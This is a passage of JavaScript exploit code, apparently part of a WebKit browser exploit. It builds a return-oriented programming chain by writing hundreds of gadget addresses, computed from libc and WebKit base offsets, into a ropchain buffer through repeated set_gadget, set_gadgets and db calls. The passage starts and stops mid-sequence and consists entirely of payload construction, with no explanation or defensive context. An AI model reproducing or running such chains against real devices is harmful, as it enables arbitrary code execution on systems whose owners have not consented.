webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+97880,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+97848,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+97864,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+97952,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+98008,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+793877,
ropchain+98088,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([8, 0]);
set_gadget(libc_base+788575,);

db([13, 0]);
set_gadgets([
webkit_base+1506828,
libc_base+793877,
ropchain+98192,
webkit_base+7438103,
libc_base+793877,
ropchain+98208,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+1838146,
libc_base+793877,
ropchain+98296,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+98352,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+98424,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+98480,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
webkit_base+2997875,
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+98568,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967288, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+98672,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+98688,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+98832,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+98800,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+98816,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+98904,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+98960,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+793877,
ropchain+99040,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([8, 0]);
set_gadget(libc_base+788575,);

db([5, 0]);
set_gadgets([
webkit_base+1506828,
libc_base+793877,
ropchain+99144,
webkit_base+7438103,
libc_base+793877,
ropchain+99160,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+877175,
libc_base+793877,
ropchain+99248,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+99304,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+99408,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+99512,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+99528,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+99672,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+99640,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+99656,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+99744,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+99800,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+793877,
ropchain+99880,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([8, 0]);
set_gadget(libc_base+788575,);

db([14, 0]);
set_gadgets([
webkit_base+1506828,
libc_base+793877,
ropchain+99984,
webkit_base+7438103,
libc_base+793877,
ropchain+100000,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+1838146,
libc_base+793877,
ropchain+100088,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+100144,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+100216,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+100272,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
webkit_base+2997875,
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,

webkit_base+7438103,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+100408,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+100512,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+100528,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+100672,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+100640,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+100656,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+100744,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+100800,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+793877,
ropchain+100880,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([8, 0]);
set_gadget(libc_base+788575,);

db([15, 0]);
set_gadgets([
webkit_base+1506828,
libc_base+793877,
ropchain+100984,
webkit_base+7438103,
libc_base+793877,
ropchain+101000,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+1838146,
libc_base+793877,
ropchain+101088,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+101144,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+101216,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+101272,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
webkit_base+2997875,
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,

libc_base+877877,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+101408,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+101512,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+101528,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+101672,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+101640,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+101656,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+101744,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+101800,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+793877,
ropchain+101880,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([8, 0]);
set_gadget(libc_base+788575,);

db([16, 0]);
set_gadgets([
webkit_base+1506828,
libc_base+793877,
ropchain+101984,
webkit_base+7438103,
libc_base+793877,
ropchain+102000,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+1838146,
libc_base+793877,
ropchain+102088,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+102144,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+102216,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+102272,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
webkit_base+2997875,
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,

libc_base+793877,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+102408,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+102512,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+102528,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+102672,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+102640,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+102656,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+102744,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+102800,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+793877,
ropchain+102880,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([8, 0]);
set_gadget(libc_base+788575,);

db([17, 0]);
set_gadgets([
webkit_base+1506828,
libc_base+793877,
ropchain+102984,
webkit_base+7438103,
libc_base+793877,
ropchain+103000,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+1838146,
libc_base+793877,
ropchain+103088,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+103144,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+103216,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+103272,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
webkit_base+2997875,
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+103360,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967288, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+103464,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+103480,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+103624,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+103592,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+103608,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+103696,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+103752,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+793877,
ropchain+103832,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([8, 0]);
set_gadget(libc_base+788575,);

db([4, 0]);
set_gadgets([
webkit_base+1506828,
libc_base+793877,
ropchain+103936,
webkit_base+7438103,
libc_base+793877,
ropchain+103952,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+877175,
libc_base+793877,
ropchain+104040,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+104096,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+104200,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+104304,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+104320,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+104464,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+104432,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+104448,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+104536,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+104592,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+793877,
ropchain+104672,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([8, 0]);
set_gadget(libc_base+788575,);

db([18, 0]);
set_gadgets([
webkit_base+1506828,
libc_base+793877,
ropchain+104776,
webkit_base+7438103,
libc_base+793877,
ropchain+104792,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+1838146,
libc_base+793877,
ropchain+104880,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+104936,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+105008,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+105064,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
webkit_base+2997875,
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,

webkit_base+7438103,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+105200,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+105304,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+105320,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+105464,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+105432,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+105448,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+105536,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+105592,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+793877,
ropchain+105672,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([8, 0]);
set_gadget(libc_base+788575,);

db([19, 0]);
set_gadgets([
webkit_base+1506828,
libc_base+793877,
ropchain+105776,
webkit_base+7438103,
libc_base+793877,
ropchain+105792,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+1838146,
libc_base+793877,
ropchain+105880,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+105936,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+106008,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+106064,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
webkit_base+2997875,
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,

libc_base+882884,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+106200,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+106304,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+106320,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+106464,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+106432,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+106448,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+106536,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+106592,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+793877,
ropchain+106672,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([8, 0]);
set_gadget(libc_base+788575,);

db([20, 0]);
set_gadgets([
webkit_base+1506828,
libc_base+793877,
ropchain+106776,
webkit_base+7438103,
libc_base+793877,
ropchain+106792,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+1838146,
libc_base+793877,
ropchain+106880,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+106936,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+107008,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+107064,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
webkit_base+2997875,
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+788575,

libc_base+793877,
libc_base+793877
]);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+793877,
ropchain+107200,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([16, 0]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+107304,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+107320,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+107464,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+107432,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+107448,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+107536,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+471355,
libc_base+793877,
ropchain+107592,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+471355,
libc_base+882884,
libc_base+793877,
ropchain+107672,
webkit_base+7438103,
webkit_base+3750700
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([8, 0]);
set_gadget(libc_base+788575,);

db([21, 0]);
set_gadgets([
webkit_base+1506828,
libc_base+793877,
ropchain+107776,
webkit_base+7438103,
libc_base+793877,
ropchain+107792,
webkit_base+7438103,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
webkit_base+1838146,
libc_base+793877,
ropchain+107880,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+107936,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+108008,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+108064,
webkit_base+7438103,
libc_base+882884,
libc_base+792472
]);

db([0, 0]);
set_gadgets([
webkit_base+2997875,
libc_base+191168,
libc_base+793877
]);
db([4294967288, 4294967295]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+108152,
webkit_base+7438103,
libc_base+759626,
libc_base+792472
]);

db([0, 0]);
set_gadget(libc_base+793877,);

db([4294967288, 4294967295]);
set_gadgets([
libc_base+547636,
libc_base+793877,
ropchain+108256,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+108272,
webkit_base+7438103,
libc_base+882884,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadgets([
libc_base+191168,
libc_base+793877,
ropchain+108416,
webkit_base+7438103,
libc_base+882884,
libc_base+793877,
ropchain+108384,
webkit_base+7438103,
libc_base+50775,
libc_base+793877,
ropchain+108400,
webkit_base+7438103,
libc_base+206806
]);

db([0, 0]);
set_gadget(libc_base+792472,);

db([0, 0]);
set_gadget(libc_base+788575,);

db([0, 0]);
set_gadget(libc_base+793877,);
db([8, 0]);
set_gadgets([
libc_base+248252,
libc_base+793877,
ropchain+108488,
